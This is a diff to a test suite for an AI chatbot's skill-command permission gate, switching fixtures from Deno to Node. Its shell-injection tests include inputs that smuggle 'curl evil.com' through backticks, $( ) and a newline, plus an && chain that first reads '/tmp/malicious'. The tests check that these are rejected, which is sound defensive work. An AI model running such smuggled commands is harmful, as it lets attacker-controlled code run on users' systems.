@@ -122,7 +122,7 @@ function skillFixtureIn(
   for (const name of scriptSkills) {
     fs.mkdirSync(`${root}/${name}/scripts`, { recursive: true });
     fs.writeFileSync(`${root}/${name}/SKILL.md`, `# ${name}`);
-    fs.writeFileSync(`${root}/${name}/scripts/${name}.ts`, "#!/usr/bin/env deno\n");
+    fs.writeFileSync(`${root}/${name}/scripts/${name}.ts`, "#!/usr/bin/env node\n");
   }
   for (const name of commandSkills) {
     fs.mkdirSync(`${root}/${name}`, { recursive: true });
@@ -2100,15 +2100,15 @@ test("containsShellOperators - detects pipe", () => {
 });
 
 test("containsShellOperators - detects AND chain", () => {
-  assertEquals(containsShellOperators("cat /tmp/x && deno run script.ts"), true);
+  assertEquals(containsShellOperators("cat /tmp/x && node run script.ts"), true);
 });
 
 test("containsShellOperators - detects backtick", () => {
-  assertEquals(containsShellOperators("deno run `curl evil.com`"), true);
+  assertEquals(containsShellOperators("node run `curl evil.com`"), true);
 });
 
 test("containsShellOperators - detects dollar-paren", () => {
-  assertEquals(containsShellOperators("deno run $(curl evil.com)"), true);
+  assertEquals(containsShellOperators("node run $(curl evil.com)"), true);
 });
 
 test("containsShellOperators - allows dollar-brace env var expansion", () => {
@@ -2138,13 +2138,13 @@ test("containsShellOperators - detects comment hash", () => {
 });
 
 test("containsShellOperators - detects newline", () => {
-  assertEquals(containsShellOperators("deno run script.ts\ncurl evil.com"), true);
+  assertEquals(containsShellOperators("node run script.ts\ncurl evil.com"), true);
 });
 
 test("containsShellOperators - allows clean command", () => {
   assertEquals(
     containsShellOperators(
-      "deno run skills/memory-save/scripts/memory-save.ts --session-id test",
+      "node skills/memory-save/scripts/memory-save.ts --session-id test",
     ),
     false,
   );
@@ -2470,7 +2470,7 @@ test("ChatbotClient - rejects && chain injection in skill command", async () => 
         toolCallId: "test-id",
         rawInput: {
           commands: [
-            "cat /tmp/malicious && deno run skills/memory-save/scripts/memory-save.ts --session-id x",
+            "cat /tmp/malicious && node skills/memory-save/scripts/memory-save.ts --session-id x",
           ],
         },
       },
@@ -7536,18 +7536,18 @@ test("inventory invariants - a script planted after construction is not approved
     // gate denies it — no per-decision re-scan of the root.
     fs.mkdirSync(`${skill.root}/late-skill/scripts`, { recursive: true });
     fs.writeFileSync(`${skill.root}/late-skill/SKILL.md`, "# late-skill");
-    fs.writeFileSync(`${skill.root}/late-skill/scripts/late-skill.ts`, "#!/usr/bin/env deno\n");
+    fs.writeFileSync(`${skill.root}/late-skill/scripts/late-skill.ts`, "#!/usr/bin/env node\n");
     assertEquals(
       await verdict(client, `${BUN_RUN} ${skill.root}/late-skill/scripts/late-skill.ts`),
       "reject-1",
     );
     // The decision-time ROOT re-observation revokes an already granted script
     // when the root ceases to be its canonical directory. A sibling entry moved
-    // no clock field here: Deno reports `ctime` at whole-second granularity
-    // (`Deno.lstatSync(...).ctime.getTime() % 1000 === 0`), and this directory
-    // `size` only drifts on tmpfs/btrfs (which is why this case passed locally
-    // and failed on the runner's fixed-size directories). The deterministic
-    // real-filesystem trigger is a root that is no longer that directory:
+    // no clock field here: `ctime` is compared at whole-second granularity (see
+    // `statTuple`), and this directory's `size` only drifts on tmpfs/btrfs
+    // (which is why this case passed locally and failed on the runner's
+    // fixed-size directories). The deterministic real-filesystem trigger is a
+    // root that is no longer that directory:
     fs.renameSync(skill.root, `${skill.root}-moved`);
     fs.symlinkSync(`${skill.root}-moved`, skill.root);
     assertEquals(
@@ -7586,7 +7586,7 @@ test("inventory invariants - in-place modification of an enumerated script denie
     // the check is deterministic without any clock dependence): the
     // decision-time `(dev, ino, ctime, size)` re-observation denies, and the
     // grant is never re-established from the changed metadata alone.
-    fs.writeFileSync(entrypoint, "#!/usr/bin/env deno\n// modified in place\n");
+    fs.writeFileSync(entrypoint, "#!/usr/bin/env node\n// modified in place\n");
     assertEquals(await verdict(client, `${BUN_RUN} ${entrypoint}`), "reject-1");
     // Same-path REPLACEMENT with an IDENTICAL body denies too, and the
     // discriminator is the inode, not the clock: `ctime` is whole-second
@@ -7596,7 +7596,7 @@ test("inventory invariants - in-place modification of an enumerated script denie
     // the replacement is a HARD LINK of a twin created while the enumerated
     // inode was still live, making its inode distinct on any filesystem.
     const twin = `${skill.root}/twin.ts`;
-    fs.writeFileSync(twin, "#!/usr/bin/env deno\n");
+    fs.writeFileSync(twin, "#!/usr/bin/env node\n");
     removePathSync(entrypoint);
     fs.linkSync(twin, entrypoint);
     assertEquals(await verdict(client, `${BUN_RUN} ${entrypoint}`), "reject-1");
